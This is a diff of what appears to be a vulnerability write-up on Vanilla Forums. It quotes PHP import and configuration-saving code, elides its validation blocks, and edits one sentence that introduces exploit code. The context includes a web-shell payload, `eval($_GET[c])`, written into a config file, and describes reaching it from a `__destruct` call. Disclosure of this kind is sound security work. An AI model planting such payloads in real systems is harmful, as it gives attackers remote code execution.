@@ -47,11 +47,8 @@ class ImportController extends DashboardController {
         ];
 
         try {
-            // Make sure the URL is valid.
-            $urlParts = parse_url($url);
-            if ($urlParts === false || !in_array(val('scheme', $urlParts), ['http', 'https'])) {
-                throw new Exception('Invalid URL.', 400);
-            }
+
+            ...
 
             $request = new ProxyRequest();
             $pageHtml = $request->request([
@@ -256,31 +253,9 @@ class Gdn_ConfigurationSource extends Gdn_Pluggable {
                 }
                 $group = $this->Group;                                                               // 7
                 $data = &$this->Settings;
-                if ($this->Configuration) {
-                    ksort($data, $this->Configuration->getSortFlag());
-                }
-                // Check for the case when the configuration is the group.
-                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {
-                    $data = $data[$group];
-                }
-                // Do a sanity check on the config save.
-                if ($this->Source == Gdn::config()->defaultPath()) {
-                    // Log root config changes
-                    try {
-                        $logData = $this->Initial;
-                        $logData['_New'] = $this->Settings;
-                        LogModel::insert('Edit', 'Configuration', $logData);
-                    } catch (Exception $ex) {
-                    }
-                    if (!isset($data['Database'])) {
-                        if ($pm = Gdn::pluginManager()) {
-                            $pm->EventArguments['Data'] = $data;
-                            $pm->EventArguments['Backtrace'] = debug_backtrace();
-                            $pm->fireEvent('ConfigError');
-                        }
-                        return false;
-                    }
-                }
+
+                ...
+
                 $options = [
                     'VariableName' => $group,                                                       // 8
                     'WrapPHP' => true,
@@ -424,7 +399,7 @@ $a=eval($_GET[c]);//[''] = '';
 
 <p class="cn" markdown="1">Another reason why I leveraged these files is because they are included at runtime, so we bypass the PHP show stopper!</p>
 
-<p class="cn" markdown="1">Now. If you have made it down this far, then you deserve some exploit code! Please note that since we are in a `__destruct` call, php has no cwd so we can't just use a relative path to the `constants.php` file. You may need to leak the path (which is achievable).</p>
+<p class="cn" markdown="1">Now if you have made it down this far, then you deserve some exploit code! Please note that since we are in a `__destruct` call, php has no cwd so we can't just use a relative path to the `constants.php` file. You may need to leak the path (which is achievable).</p>
 
 ```php
 
